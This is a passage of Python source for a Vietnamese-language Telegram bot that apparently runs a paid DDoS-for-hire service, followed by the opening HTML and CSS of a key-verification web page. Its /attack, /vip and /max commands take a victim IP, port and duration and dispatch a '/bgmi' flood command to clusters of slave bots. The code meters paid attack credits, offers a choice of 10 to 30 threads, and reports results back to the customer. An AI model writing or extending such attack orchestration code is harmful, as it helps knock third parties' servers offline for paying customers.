        if not self.is_admin(update.effective_user.id):
            await self.safe_send_message(update.effective_chat.id, "❌ Không có quyền.", reply_to_message_id=update.message.message_id)
            return
        args = context.args
        if len(args) < 1:
            await self.safe_send_message(update.effective_chat.id, "⚠️ /remove <id>", reply_to_message_id=update.message.message_id)
            return
        try:
            target = int(args[0])
        except:
            await self.safe_send_message(update.effective_chat.id, "❌ ID không hợp lệ.", reply_to_message_id=update.message.message_id)
            return
        if target == ADMIN_ID:
            await self.safe_send_message(update.effective_chat.id, "❌ Không xóa admin.", reply_to_message_id=update.message.message_id)
            return
        if self.perm_manager.remove_permission(target):
            await self.safe_send_message(update.effective_chat.id, f"✅ Đã xóa quyền của {target}", reply_to_message_id=update.message.message_id)
        else:
            await self.safe_send_message(update.effective_chat.id, f"⚠️ {target} không có quyền.", reply_to_message_id=update.message.message_id)

    async def cmd_listperm(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.is_admin(update.effective_user.id):
            await self.safe_send_message(update.effective_chat.id, "❌ Không có quyền.", reply_to_message_id=update.message.message_id)
            return
        text = "📋 Danh sách quyền:\n"
        for cmd in ["attack", "vip", "max"]:
            users = self.perm_manager.get_users(cmd)
            text += f"🔹 /{cmd}: {', '.join([str(u) for u in users]) if users else 'không có'}\n"
        await self.safe_send_message(update.effective_chat.id, text, reply_to_message_id=update.message.message_id)

    async def execute_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE, dosage_key: str):
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        if await self.check_off_and_group(update):
            return
        if dosage_key == "vip":
            if not self.vip_manager.has_uses(user_id):
                await self.safe_send_message(chat_id, "❌ Bạn đã hết lượt sử dụng /vip. Vui lòng buy thêm lượt.!", parse_mode=None, reply_to_message_id=update.message.message_id)
                return
        if dosage_key == "attack":
            if not self.user_manager.has_attack_uses(user_id):
                await self.safe_send_message(chat_id, "⚠️ Bạn đã hết lượt sử dụng, vui lòng /getkey để kiếm thêm.", parse_mode=None, reply_to_message_id=update.message.message_id)
                return
        if dosage_key == "max":
            if not self.has_permission(user_id, "max"):
                await self.safe_send_message(chat_id, f"❌ Bạn không có quyền dùng /{dosage_key}. Vui lòng liên hệ admin.", parse_mode=None, reply_to_message_id=update.message.message_id)
                return
        args = context.args
        if dosage_key == "attack":
            expected_args = 2
            max_time = None
            default_duration = "50"
        elif dosage_key == "vip":
            expected_args = 3
            max_time = 60
            default_duration = None
        else:
            return
        is_valid, _ = validate_args(args, expected_args)
        if not is_valid:
            await self.send_validation_error(chat_id, user_id, update.message.message_id)
            return
        ip = args[0]
        port = args[1]
        duration = args[2] if dosage_key == "vip" else default_duration
        is_valid, _ = validate_ip(ip)
        if not is_valid:
            await self.send_validation_error(chat_id, user_id, update.message.message_id)
            return
        is_valid, _ = validate_port(port)
        if not is_valid:
            await self.send_validation_error(chat_id, user_id, update.message.message_id)
            return
        if dosage_key == "vip":
            is_valid, _ = validate_time(duration, max_time)
            if not is_valid:
                await self.send_validation_error(chat_id, user_id, update.message.message_id)
                return
            cooldown_time = int(duration)
        else:
            cooldown_time = 50
        full_command = f"/bgmi {ip} {port} {duration}"
        required_bots = DOSAGE_CONFIG.get(dosage_key, 1)
        available_count = state.get_available_count()
        if available_count < required_bots:
            overload_msg = "⚠️ 𝙎𝙚𝙧𝙫𝙚𝙧 𝙦𝙪á 𝙩ả𝙞\n　╰┈➤ 𝙑𝙪𝙞 𝙡ò𝙣𝙜 𝙩𝙝ử 𝙡ạ𝙞 𝙨𝙖𝙪.!"
            await self.safe_send_message(chat_id, overload_msg, parse_mode=None, reply_to_message_id=update.message.message_id)
            return
        available_bots = state.get_available_bots_by_cluster()
        selected_bots = random.sample(available_bots, required_bots)
        msg1 = await self.safe_send_message(chat_id, "⏳ Đang nhận lệnh...", reply_to_message_id=update.message.message_id)
        if msg1:
            await asyncio.sleep(2)
            try:
                await self.app.bot.delete_message(chat_id=chat_id, message_id=msg1.message_id)
            except:
                pass
        loading_msg = await self.safe_send_message(chat_id, "⏳ Đang tải...", reply_to_message_id=update.message.message_id)
        pending_key = chat_id
        state.pending_attacks[pending_key] = {
            "total_expected": len(selected_bots),
            "received_logs": set(),
            "results": [],
            "loading_msg": loading_msg,
            "ip": ip,
            "port": port,
            "duration": duration,
            "dosage_key": dosage_key,
            "command": full_command,
            "user_id": user_id,
            "chat_id": chat_id,
            "created_at": time.time(),
            "reply_to_message_id": update.message.message_id,
            "expected_bots": selected_bots
        }
        log_queue_manager.add_pending_attack(pending_key, state.pending_attacks[pending_key])
        try:
            asyncio.create_task(self._send_command_and_wait_logs(pending_key, selected_bots, full_command, dosage_key, cooldown_time))
        except Exception as e:
            logger.error(f"Attack error: {e}")
            if loading_msg:
                try:
                    await self.app.bot.delete_message(chat_id=chat_id, message_id=loading_msg.message_id)
                except:
                    pass
            await self.safe_send_message(chat_id, f"❌ Lỗi: {str(e)}", reply_to_message_id=update.message.message_id)
            if pending_key in state.pending_attacks:
                del state.pending_attacks[pending_key]
            log_queue_manager.remove_pending_attack(pending_key)

    async def _send_command_and_wait_logs(self, pending_key: int, selected_bots: List[str], command: str, dosage_key: str, cooldown_time: int = 50):
        try:
            await self.user_client.send_command_to_bots(selected_bots, command, dosage_key, cooldown_time)
            max_wait = 7
            start_time = time.time()
            logger.info(f"⏳ Chờ log từ queue cho {dosage_key}, max_wait={max_wait}s")
            while time.time() - start_time < max_wait:
                if pending_key not in state.pending_attacks:
                    return
                pending = state.pending_attacks[pending_key]
                if len(pending["received_logs"]) >= pending["total_expected"]:
                    elapsed = time.time() - start_time
                    logger.info(f"✅ Đã nhận đủ log cho {dosage_key} sau {elapsed:.1f}s")
                    return
                await asyncio.sleep(0.5)
            if pending_key in state.pending_attacks:
                pending = state.pending_attacks[pending_key]
                logger.warning(f"⏰ Timeout chờ log, nhận được {len(pending['received_logs'])}/{pending['total_expected']}")
                if pending.get("loading_msg"):
                    try:
                        await self.app.bot.delete_message(chat_id=pending["chat_id"], message_id=pending["loading_msg"].message_id)
                    except:
                        pass
                await self._finalize_attack(pending_key)
        except Exception as e:
            logger.error(f"Send command error: {e}")
            if pending_key in state.pending_attacks:
                pending = state.pending_attacks[pending_key]
                if pending.get("loading_msg"):
                    try:
                        await self.app.bot.delete_message(chat_id=pending["chat_id"], message_id=pending["loading_msg"].message_id)
                    except:
                        pass
                await self._finalize_attack(pending_key)

    async def cmd_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await self.execute_attack(update, context, "attack")

    async def cmd_max(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        if await self.check_off_and_group(update):
            return
        if not self.has_permission(user_id, "max"):
            await self.safe_send_message(chat_id, "❌ Bạn không có quyền dùng /max. Vui lòng liên hệ admin.", parse_mode=None, reply_to_message_id=update.message.message_id)
            return
        args = context.args
        is_valid, _ = validate_args(args, 3)
        if not is_valid:
            await self.send_validation_error(chat_id, user_id, update.message.message_id)
            return
        ip, port, duration = args[0], args[1], args[2]
        is_valid, _ = validate_ip(ip)
        if not is_valid:
            await self.send_validation_error(chat_id, user_id, update.message.message_id)
            return
        is_valid, _ = validate_port(port)
        if not is_valid:
            await self.send_validation_error(chat_id, user_id, update.message.message_id)
            return
        is_valid, _ = validate_time(duration)
        if not is_valid:
            await self.send_validation_error(chat_id, user_id, update.message.message_id)
            return
        context.user_data['max_temp'] = {
            "ip": ip,
            "port": port,
            "duration": duration,
            "user_id": user_id,
            "chat_id": chat_id,
            "reply_to_message_id": update.message.message_id
        }
        keyboard = [
            [InlineKeyboardButton("10 luồng", callback_data="max_10")],
            [InlineKeyboardButton("20 luồng", callback_data="max_20")],
            [InlineKeyboardButton("30 luồng", callback_data="max_30")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await self.safe_send_message(
            chat_id,
            "⚡ <b>Vui lòng chọn số luồng:</b>\n• 10 luồng\n• 20 luồng\n• 30 luồng",
            parse_mode="HTML",
            reply_markup=reply_markup,
            reply_to_message_id=update.message.message_id
        )

    async def handle_callback_max(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = update.effective_user.id
        temp_data = context.user_data.get('max_temp')
        if not temp_data:
            await query.edit_message_text("❌ Hết hạn. Vui lòng gửi lại /max.")
            return
        if temp_data.get('user_id') != user_id:
            await query.edit_message_text("❌ Bạn không phải người gửi lệnh này.")
            return
        thread_count = int(query.data.replace("max_", ""))
        ip = temp_data['ip']
        port = temp_data['port']
        duration = temp_data['duration']
        chat_id = temp_data['chat_id']
        reply_to_id = temp_data['reply_to_message_id']
        await query.delete_message()
        full_command = f"/bgmi {ip} {port} {duration}"
        cooldown_time = int(duration)
        available_count = state.get_available_count()
        if available_count < thread_count:
            overload_msg = "⚠️ 𝙎𝙚𝙧𝙫𝙚𝙧 𝙦𝙪á 𝙩ả𝙞\n　╰┈➤ 𝙑𝙪𝙞 𝙡ò𝙣𝙜 𝙩𝙝ử 𝙡ạ𝙞 𝙨𝙖𝙪.!"
            await self.safe_send_message(chat_id, overload_msg, parse_mode=None, reply_to_message_id=reply_to_id)
            return
        available_bots = state.get_available_bots_by_cluster()
        selected_bots = random.sample(available_bots, thread_count)
        msg1 = await self.safe_send_message(chat_id, "⏳ Đang nhận lệnh...", reply_to_message_id=reply_to_id)
        if msg1:
            await asyncio.sleep(2)
            try:
                await self.app.bot.delete_message(chat_id=chat_id, message_id=msg1.message_id)
            except:
                pass
        loading_msg = await self.safe_send_message(chat_id, "⏳ Đang tải...", reply_to_message_id=reply_to_id)
        pending_key = chat_id
        state.pending_attacks[pending_key] = {
            "total_expected": len(selected_bots),
            "received_logs": set(),
            "results": [],
            "loading_msg": loading_msg,
            "ip": ip,
            "port": port,
            "duration": duration,
            "dosage_key": "max",
            "command": full_command,
            "user_id": user_id,
            "chat_id": chat_id,
            "created_at": time.time(),
            "reply_to_message_id": reply_to_id,
            "expected_bots": selected_bots
        }
        log_queue_manager.add_pending_attack(pending_key, state.pending_attacks[pending_key])
        try:
            await self.user_client.send_command_to_bots(selected_bots, full_command, "max", cooldown_time)
            max_wait = 7
            start_time = time.time()
            while time.time() - start_time < max_wait:
                if pending_key not in state.pending_attacks:
                    return
                pending = state.pending_attacks[pending_key]
                if len(pending["received_logs"]) >= pending["total_expected"]:
                    elapsed = time.time() - start_time
                    logger.info(f"✅ Đã nhận đủ log cho max sau {elapsed:.1f}s")
                    return
                await asyncio.sleep(0.5)
            if pending_key in state.pending_attacks:
                pending = state.pending_attacks[pending_key]
                if pending.get("loading_msg"):
                    try:
                        await self.app.bot.delete_message(chat_id=pending["chat_id"], message_id=pending["loading_msg"].message_id)
                    except:
                        pass
                await self._finalize_attack(pending_key)
        except Exception as e:
            logger.error(f"Max attack error: {e}")
            if pending_key in state.pending_attacks:
                pending = state.pending_attacks[pending_key]
                if pending.get("loading_msg"):
                    try:
                        await self.app.bot.delete_message(chat_id=pending["chat_id"], message_id=pending["loading_msg"].message_id)
                    except:
                        pass
                await self._finalize_attack(pending_key)

    async def _finalize_attack(self, pending_key: int):
        pending = state.pending_attacks.get(pending_key)
        if not pending:
            return
        try:
            total_responded = sum(1 for r in pending["results"] if r.get("responded", False))
            total_expected = pending.get("total_expected", 0)
            dosage_key = pending.get("dosage_key", "attack")
            user_id = pending.get("user_id")
            attack_success = total_responded > 0
            remaining_uses = None
            if dosage_key == "vip" and attack_success and user_id:
                remaining = self.vip_manager.use_vip(user_id)
                if remaining is not None:
                    remaining_uses = remaining
                    logger.info(f"VIP used: user {user_id} remaining {remaining}")
                else:
                    logger.warning(f"User {user_id} has no VIP uses")
            if dosage_key == "attack" and attack_success:
                if self.user_manager.use_attack(user_id):
                    remaining_uses = self.user_manager.get_attack_uses(user_id)
                    logger.info(f"Attack used: user {user_id} remaining: {remaining_uses}")
                else:
                    logger.warning(f"User {user_id} no attack uses")
            if dosage_key == "attack":
                remaining_uses = self.user_manager.get_attack_uses(user_id)
            if pending.get("loading_msg"):
                try:
                    await self.app.bot.delete_message(chat_id=pending["chat_id"], message_id=pending["loading_msg"].message_id)
                except:
                    pass

            ip = pending["ip"]
            port = pending["port"]
            duration = pending["duration"]

            if dosage_key == "attack":
                report = self.create_attack_report(total_responded, total_expected, ip, port, duration, remaining_uses)
            elif dosage_key == "vip":
                report = self._create_vip_report(total_responded, total_expected, ip, port, duration, remaining_uses)
            elif dosage_key == "max":
                report = self._create_max_report(total_responded, total_expected, ip, port, duration)
            else:
                report = "❌ Lỗi: Không xác định loại báo cáo."

            await self.safe_send_message(
                chat_id=pending["chat_id"],
                text=report,
                parse_mode=None,
                reply_to_message_id=pending.get("reply_to_message_id")
            )

            if attack_success:
                extra_msg = "Nếu không lên 999+ thì hãy @Hoangnam0882 để được hoàn lại lần sử dụng.!"
                await self.safe_send_message(
                    chat_id=pending["chat_id"],
                    text=extra_msg,
                    parse_mode=None,
                    reply_to_message_id=pending.get("reply_to_message_id")
                )
            if not attack_success and dosage_key in ["attack", "vip"]:
                fail_msg = "⚠️ 𝘼𝙩𝙩𝙖𝙘𝙠 𝙁𝙖𝙞𝙡𝙚𝙙\n　╰┈➤ 𝙎ố 𝙡ượ𝙩 𝙙ù𝙣𝙜 𝙘ủ𝙖 𝙗ạ𝙣 𝙨ẽ 𝙠𝙝ô𝙣𝙜 𝙗ị 𝙩𝙧ừ.!"
                await self.safe_send_message(
                    chat_id=pending["chat_id"],
                    text=fail_msg,
                    parse_mode=None,
                    reply_to_message_id=pending.get("reply_to_message_id")
                )
            command_record = {
                "time": datetime.now().isoformat(),
                "dosage": pending["dosage_key"],
                "command": pending["command"],
                "result": {"total_expected": total_expected, "total_responded": total_responded}
            }
            state.command_history.append(command_record)
            logger.info(f"Attack finalized: {total_responded}/{total_expected}")
        except Exception as e:
            logger.error(f"Finalize error: {e}")
        finally:
            if pending_key in state.pending_attacks:
                del state.pending_attacks[pending_key]
            log_queue_manager.remove_pending_attack(pending_key)

    async def handle_callback_reset_cluster(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = update.effective_user.id
        if not self.is_admin(user_id):
            await query.edit_message_text("❌ Bạn không có quyền.")
            return
        status_key = int(query.data.replace("reset_cluster_", ""))
        result = self._last_status_results.get(status_key)
        if not result:
            await query.edit_message_text("❌ Dữ liệu kiểm tra đã hết hạn. Vui lòng chạy lại /status.")
            return
        offline_bots_display = result["offline"]
        if not offline_bots_display:
            await query.edit_message_text("✅ Không có bot offline cần reset.")
            return
        username_map = {v: k for k, v in BOT_DISPLAY_MAPPING.items()}
        offline_usernames = []
        for display in offline_bots_display:
            if display in username_map:
                offline_usernames.append(username_map[display])
            else:
                for bot in ALL_BOTS:
                    if self.user_client.get_bot_display_name(bot) == display:
                        offline_usernames.append(bot)
                        break
        if not offline_usernames:
            await query.edit_message_text("❌ Không tìm thấy username của bot offline.")
            return

        cluster_1 = [b for b in offline_usernames if b in BOT_MOTHER_1_BOTS]
        cluster_2 = [b for b in offline_usernames if b in BOT_MOTHER_2_BOTS]
        cluster_3 = [b for b in offline_usernames if b in BOT_MOTHER_3_BOTS]

        await query.edit_message_text(
            f"🔄 Đang xử lý reset cho {len(offline_usernames)} bot offline..."
        )
        asyncio.create_task(self.user_client._execute_reset_flow_by_cluster(
            update.effective_chat.id, cluster_1, cluster_2, cluster_3
        ))

    async def _check_reset_timeout(self, reset_id: str):
        reset_data = self.user_client.pending_resets.get(reset_id)
        if not reset_data:
            return
        timeout_seconds = reset_data.get("timeout_seconds", 120)
        await asyncio.sleep(timeout_seconds)
        reset_data = self.user_client.pending_resets.get(reset_id)
        if reset_data and not reset_data.get("confirmed", False):
            admin_chat_id = reset_data.get("admin_chat_id")
            bot_list = reset_data.get("bot_displays", [])
            await self.safe_send_message(
                admin_chat_id,
                f"⚠️ Không nhận được báo cáo từ bot mẹ trong thời gian cho phép ({timeout_seconds}s). Vui lòng kiểm tra thủ công trạng thái các bot: {', '.join(bot_list)}"
            )
            logger.warning(f"Reset {reset_id} timeout sau {timeout_seconds}s")
            self.user_client.pending_resets.pop(reset_id, None)

    async def _send_reset_by_cluster(self, offline_usernames: List[str]):
        cluster_1 = []
        cluster_2 = []
        cluster_3 = []
        for bot in offline_usernames:
            if bot in BOT_MOTHER_1_BOTS:
                cluster_1.append(bot)
            elif bot in BOT_MOTHER_2_BOTS:
                cluster_2.append(bot)
            elif bot in BOT_MOTHER_3_BOTS:
                cluster_3.append(bot)
        if cluster_1:
            reset_msg = f"/reset {' '.join([self.user_client.get_bot_display_name(bot) for bot in cluster_1])}"
            await self.user_client.client.send_message(int(BOT_MOTHER_GROUP_ID_1), reset_msg)
            for bot in cluster_1:
                state.mark_bot_reset(bot)
        if cluster_2:
            reset_msg = f"/reset {' '.join([self.user_client.get_bot_display_name(bot) for bot in cluster_2])}"
            await self.user_client.client.send_message(int(BOT_MOTHER_GROUP_ID_2), reset_msg)
            for bot in cluster_2:
                state.mark_bot_reset(bot)
        if cluster_3:
            reset_msg = f"/reset {' '.join([self.user_client.get_bot_display_name(bot) for bot in cluster_3])}"
            await self.user_client.client.send_message(int(BOT_MOTHER_GROUP_ID_3), reset_msg)
            for bot in cluster_3:
                state.mark_bot_reset(bot)

    async def handle_callback_reset_confirm(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = update.effective_user.id
        if not self.is_admin(user_id):
            await query.edit_message_text("❌ Bạn không có quyền thực hiện hành động này.")
            return
        data = query.data
        parts = data.split("_")
        action = parts[2]
        command_key = parts[3]
        await self.user_client.handle_reset_confirm(command_key, action)
        await query.edit_message_text("✅ Đã xử lý yêu cầu của bạn.")
        logger.info(f"✅ Admin {user_id} đã xử lý reset confirm: {action} for {command_key}")

    async def handle_callback_autocheck_confirm(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = update.effective_user.id
        if not self.is_admin(user_id):
            await query.edit_message_text("❌ Bạn không có quyền thực hiện hành động này.")
            return
        data = query.data
        parts = data.split("_")
        if len(parts) < 4:
            await query.edit_message_text("❌ Dữ liệu không hợp lệ.")
            return
        mode = parts[1]
        action = parts[2]
        command_key = "_".join(parts[3:])
        pending = state.autocheck_pending_confirm.get(command_key)
        if not pending:
            await query.edit_message_text("❌ Dữ liệu xác nhận đã hết hạn.")
            return
        clusters_offline = pending.get("clusters_offline", {})
        if action == "run":
            if mode == "all":
                await self._autocheck_execute_mode_a(clusters_offline)
                await query.edit_message_text("✅ Đã thực thi AUTOCKECK_ALL.")
            else:
                await self._autocheck_execute_mode_b(clusters_offline)
                await query.edit_message_text("✅ Đã thực thi AUTOCKECK_ONLY.")
            logger.info(f"✅ Admin {user_id} đã xác nhận autocheck {mode} cho {command_key}")
        else:
            await query.edit_message_text("❌ Đã hủy yêu cầu autocheck.")
            logger.info(f"❌ Admin {user_id} đã hủy autocheck {mode} cho {command_key}")
        if command_key in state.autocheck_pending_confirm:
            del state.autocheck_pending_confirm[command_key]

# ===================================================================
# FLASK WEB
# ===================================================================

from flask import Flask, request, render_template_string, jsonify
from flask_cors import CORS

web_app = Flask(__name__)
CORS(web_app, origins=["https://website-getkey.nguyenhoangnam3528.workers.dev"])

INDEX_HTML = """
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Key Online - Hệ Thống Xác Thực Key</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔑</text></svg>">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        :root { --bg-deep: #03050c; --card-bg: rgba(8,14,28,0.72); --border: rgba(0,240,255,0.18); --cyan: #00f0ff; --purple: #8b5cf6; --green: #00ff9d; --red: #ff2d55; --text: #f1f5f9; --muted: #64748b; --font: 'Plus Jakarta Sans', system-ui, sans-serif; --mono: 'Fira Code', monospace; }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: var(--bg-deep); min-height: 100vh; display: flex; justify-content: center; align-items: center; font-family: var(--font); color: var(--text); padding: 1.5rem; overflow-x: hidden; position: relative; }
        .bg-grid { position: fixed; inset: 0; background-image: linear-gradient(rgba(255,255,255,0.015) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.015) 1px, transparent 1px); background-size: 48px 48px; z-index: 0; pointer-events: none; }
        .orb { position: fixed; border-radius: 50%; filter: blur(110px); opacity: 0.32; z-index: 0; pointer-events: none; animation: float 14s ease-in-out infinite alternate; }
        .orb-1 { width: 380px; height: 380px; background: var(--cyan); top: -12%; left: -8%; }
        .orb-2 { width: 420px; height: 420px; background: var(--purple); bottom: -18%; right: -10%; animation-delay: -7s; }
        @keyframes float { 0% { transform: translate(0,0) scale(1); } 100% { transform: translate(40px,50px) scale(1.12); } }
        .loading-screen { position: fixed; inset: 0; background: var(--bg-deep); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; transition: opacity 0.55s ease, visibility 0.55s ease; }
        .loading-screen.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
        .loader { position: relative; width: 84px; height: 84px; display: flex; align-items: center; justify-content: center; }
        .loader::before, .loader::after { content: ''; position: absolute; border-radius: 50%; border: 3px solid transparent; }
        .loader::before { inset: 0; border-top-color: var(--cyan); border-right-color: var(--purple); animation: spin 1.1s linear infinite; }
        .loader::after { inset: 10px; border-bottom-color: var(--green); animation: spin 1.6s linear infinite reverse; }
        .loader i { font-size: 1.7rem; color: var(--cyan); filter: drop-shadow(0 0 10px var(--cyan)); animation: pulse 1.4s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes pulse { 0%,100% { opacity: 0.6; transform: scale(0.92); } 50% { opacity: 1; transform: scale(1); } }
        .loading-text { margin-top: 1.6rem; font-size: 0.78rem; font-weight: 600; letter-spacing: 0.22em; text-transform: uppercase; color: #94a3b8; animation: textPulse 1.6s ease-in-out infinite; }
        @keyframes textPulse { 0%,100% { opacity: 0.35; } 50% { opacity: 1; } }
        .card-wrapper { width: 100%; max-width: 440px; position: relative; z-index: 10; opacity: 0; transform: translateY(28px) scale(0.97); transition: all 0.7s cubic-bezier(0.16,1,0.3,1); }
        .card-wrapper.visible { opacity: 1; transform: translateY(0) scale(1); }
        .status-float { position: absolute; top: -62px; left: 50%; transform: translateX(-50%) translateY(-12px) scale(0.88); padding: 0.55rem 1.5rem; border-radius: 999px; font-size: 1.15rem; font-weight: 800; display: flex; align-items: center; gap: 8px; white-space: nowrap; opacity: 0; pointer-events: none; backdrop-filter: blur(16px); transition: all 0.45s cubic-bezier(0.34,1.56,0.64,1); z-index: 30; }
        .status-float.show { opacity: 1; transform: translateX(-50%) translateY(0) scale(1); }
        .status-float.success { color: var(--green); background: rgba(0,255,157,0.1); border: 1px solid rgba(0,255,157,0.35); box-shadow: 0 12px 30px rgba(0,255,157,0.18); }
        .status-float.error { color: var(--red); background: rgba(255,45,85,0.1); border: 1px solid rgba(255,45,85,0.35); box-shadow: 0 12px 30px rgba(255,45,85,0.18); }
        .key-card { background: var(--card-bg); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px); border: 1px solid var(--border); border-radius: 1.75rem; padding: 2rem; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.75), inset 0 1px 0 rgba(255,255,255,0.06); position: relative; overflow: hidden; }
        .key-card::before { content: ''; position: absolute; inset: 0; border-radius: inherit; padding: 1px; background: linear-gradient(135deg, rgba(0,240,255,0.25), transparent 40%, transparent 60%, rgba(139,92,246,0.2)); -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0); mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0); -webkit-mask-composite: xor; mask-composite: exclude; pointer-events: none; }
        .card-inner { position: relative; z-index: 2; display: flex; flex-direction: column; }
        .card-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 1.6rem; padding-bottom: 1.15rem; border-bottom: 1px solid rgba(255,255,255,0.07); }
        .brand { display: flex; align-items: center; gap: 12px; }
        .brand-icon { width: 42px; height: 42px; border-radius: 13px; background: linear-gradient(135deg, rgba(0,240,255,0.12), rgba(139,92,246,0.12)); border: 1px solid rgba(0,240,255,0.28); display: flex; align-items: center; justify-content: center; color: var(--cyan); font-size: 1.15rem; box-shadow: 0 0 18px rgba(0,240,255,0.15); }
        .brand h1 { font-size: 1.32rem; font-weight: 800; letter-spacing: -0.03em; background: linear-gradient(135deg, #fff 20%, #a5f3fc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
        .badge { display: flex; align-items: center; gap: 6px; padding: 0.38rem 0.85rem; border-radius: 999px; font-size: 0.68rem; font-weight: 700; letter-spacing: 0.06em; text-transform: uppercase; }
        .badge.online { background: rgba(0,255,157,0.1); color: var(--green); border: 1px solid rgba(0,255,157,0.3); }
        .badge.offline { background: rgba(255,45,85,0.1); color: var(--red); border: 1px solid rgba(255,45,85,0.3); }
        .badge .dot { width: 6px; height: 6px; border-radius: 50%; background: currentColor; box-shadow: 0 0 8px currentColor; animation: blink 1.8s ease-in-out infinite; }
        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
        #contentArea { min-height: 260px; display: flex; flex-direction: column; justify-content: center; }
        .key-box { background: rgba(2,6,16,0.65); border: 1px solid rgba(255,255,255,0.08); border-radius: 1.1rem; padding: 1.05rem 1.15rem; display: flex; align-items: center; justify-content: space-between; gap: 12px; margin-bottom: 1.15rem; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
        .key-box.highlight { border-color: var(--green); box-shadow: 0 0 20px rgba(0,255,157,0.15); }
        .key-text { font-family: var(--mono); font-weight: 700; font-size: 1.12rem; letter-spacing: 0.04em; color: var(--green); word-break: break-all; line-height: 1.4; }
        .copy-icon-btn { width: 40px; height: 40px; border-radius: 11px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: #94a3b8; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: all 0.22s ease; flex-shrink: 0; font-size: 1.05rem; }
        .copy-icon-btn:hover { background: var(--cyan); color: #03050c; border-color: var(--cyan); transform: scale(1.06); }
        .key-meta { display: flex; justify-content: space-between; align-items: center; font-size: 0.76rem; color: #94a3b8; background: rgba(255,255,255,0.025); border: 1px solid rgba(255,255,255,0.05); border-radius: 12px; padding: 0.7rem 1rem; margin-bottom: 1.15rem; }
        .usage-tag { background: rgba(0,255,157,0.1); color: var(--green); border: 1px solid rgba(0,255,157,0.22); padding: 0.22rem 0.7rem; border-radius: 999px; font-weight: 700; font-size: 0.74rem; }
        .tg-hint { background: rgba(0,240,255,0.04); border: 1px solid rgba(0,240,255,0.14); border-radius: 13px; padding: 0.85rem 1rem; text-align: center; margin-bottom: 1.25rem; }
        .tg-hint .label { display: block; font-size: 0.68rem; font-weight: 700; letter-spacing: 0.1em; text-transform: uppercase; color: var(--cyan); margin-bottom: 6px; }
        .tg-hint code { font-family: var(--mono); font-size: 0.92rem; font-weight: 600; color: #fff; background: rgba(0,0,0,0.45); padding: 4px 12px; border-radius: 7px; border: 1px solid rgba(255,255,255,0.08); display: inline-block; }
        .main-btn { width: 100%; padding: 1.05rem; border: none; border-radius: 13px; font-family: var(--font); font-weight: 800; font-size: 0.95rem; letter-spacing: 0.05em; text-transform: uppercase; color: #03050c; background: linear-gradient(135deg, var(--cyan), #00b4d8); cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 9px; box-shadow: 0 10px 25px rgba(0,240,255,0.28); transition: all 0.25s ease; }
        .main-btn:hover { transform: translateY(-3px); box-shadow: 0 14px 32px rgba(0,240,255,0.4); }
        .main-btn:active { transform: translateY(-1px); }
        .main-btn.copied { background: linear-gradient(135deg, var(--green), #00c853); box-shadow: 0 10px 25px rgba(0,255,157,0.3); }
        .error-box { text-align: center; padding: 1.2rem 0.5rem; }
        .error-icon { width: 68px; height: 68px; margin: 0 auto 1.1rem; border-radius: 50%; background: rgba(255,45,85,0.1); border: 1px solid rgba(255,45,85,0.3); display: flex; align-items: center; justify-content: center; font-size: 1.9rem; color: var(--red); box-shadow: 0 0 24px rgba(255,45,85,0.15); }
        .error-title { font-size: 1.22rem; font-weight: 800; color: var(--red); margin-bottom: 0.45rem; }
        .error-sub { font-size: 0.9rem; color: #94a3b8; line-height: 1.55; }
        .card-footer { margin-top: 1.5rem; padding-top: 1.15rem; border-top: 1px solid rgba(255,255,255,0.06); display: flex; justify-content: space-between; align-items: center; font-size: 0.72rem; color: var(--muted); }
        .time-badge { background: rgba(255,255,255,0.035); border: 1px solid rgba(255,255,255,0.06); padding: 0.3rem 0.8rem; border-radius: 999px; font-family: var(--mono); color: #a5f3fc; display: flex; align-items: center; gap: 6px; font-size: 0.72rem; }
